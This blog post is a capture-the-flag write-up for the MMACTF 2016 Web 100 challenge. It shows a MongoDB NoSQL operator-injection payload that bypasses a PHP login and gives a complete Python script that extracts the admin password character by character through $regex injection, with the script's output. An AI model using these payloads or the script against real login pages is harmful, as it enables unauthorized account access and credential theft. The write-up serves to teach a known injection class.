---
author: AnirudhAnand
layout: post
title: MongoDB - Extracting data (admin password) using NoSQL Injection - MMACTF 2016 Web 100 writeup
categories:
- ctf
summary: Using NoSQL injections to extract admin password from the database (MMACTF 2016 web 100 writeup)
description: Using NoSQL injections to extract admin password from the database (MMACTF 2016 web 100 writeup)
---

## Introduction

MMACTF 2015 was indeed a great learning experience, so I made sure that I took part in it this year. Last year, there were some really great challenges like "[Local File inclusion + File Upload = Remote Code execution]({%post_url 2015/CTF_writeups/MMACTF_2015/2015-09-07-mmactf-web300-challenge-writeup %})" and "[Executing php using script tags]({%post_url 2015/CTF_writeups/MMACTF_2015/2015-09-07-mmact-web-100-challenge %})". Both of them were real learning experience.

## Challenge

So this year I started again, hoping that it would be fun just like the last year and fortunately it was ! So lets go ahead and solve web 100. We were given a login page and a sample account `test:test` to login. I tried logging in and it simply says "You are logged in as test". Our aim is to login as admin. So the only possible injection place is the login page.

Challenge URL: [http://gap.chal.ctf.westerns.tokyo/login.php](http://gap.chal.ctf.westerns.tokyo/login.php)

Obviously the first thing to try is SQL injection but after messing around with the login page for sometime, I understood it has nothing to do with SQL. The next attempt was to try NoSQL and then I got some very interesting result. From the initial injection, it seems the backend database is MongoDB and I decided to read a bit more about it.

In simple terms, MongoDB works like this:

Request: `login.php?user=admin&password=1`

{%highlight php lineos %}
$collection->find(array(
    "username" => "admin",
    "passwd" => "1"
));
{%endhighlight%}

## Solution

The username and password is collected from the incoming data and the database is searched directly using this data. So what if we can pass objects or arrays ?

Request: `login.php?user[$gt]=&password[$gt]=`

{%highlight php lineos %}
$collection->find(array(
    "username" => array("$gt" => 1),
    "passwd" => array("$gt" => 1)
));
{%endhighlight%}

This will bypass the Authentication scheme and will drop us right into the first account in the database, which is admin ! So now we are now logged in as **admin** ! But the flag is the password of admin so we need to extract it. I googled on how to extract data but that didn't gave me much options. Later I came to know about `$regex` using which we can compare the password character by character. So here is the logic:

We initiate request with `user=admin&password[$regex]=T.*`. You can see that this gives a `302` redirect because the password starts with T (as password is flag and according to rules, flags starts with `TWCTF`). For all other characters, it gives back the status code `200`. We can easily automate this to find the rest of the password

{%highlight python lineos %}

import requests
import string

# We are sure that password is the flag which starts with "TWCTF{"
# and ends with "}"

flag = "TWCTF{"
url = "http://gap.chal.ctf.westerns.tokyo/login.php"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'user': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break


{%endhighlight%}

## Output

Script works the following way:

1) Since the password is the flag, we are sure that it starts with `TWCTF{` so this can be used to verify if what we are doing is correct.

2) I assumed that characters like `+`, `*` and `&` will not be there because it could break the Regex (and lucky it wasn't there !)

3) Script stops when we get a 302 redirection when the character is `}` because we are sure that the end character will be `}` (again, because password is same as flag).

{%highlight python lineos %}
TWCTF{w
TWCTF{wa
TWCTF{was
TWCTF{wass
TWCTF{wassh
TWCTF{wassho
TWCTF{wasshoi
TWCTF{wasshoi!
TWCTF{wasshoi!s
TWCTF{wasshoi!su
TWCTF{wasshoi!sum
TWCTF{wasshoi!summ
TWCTF{wasshoi!summe
TWCTF{wasshoi!summer
{%endhighlight%}

## References

These are some of the awesome references which came in handy during solving this problem:

1. [Mongodb is vulnerable to SQL injection in PHP at least](https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/)
2. [Hacking NodeJs and MongoDB](http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
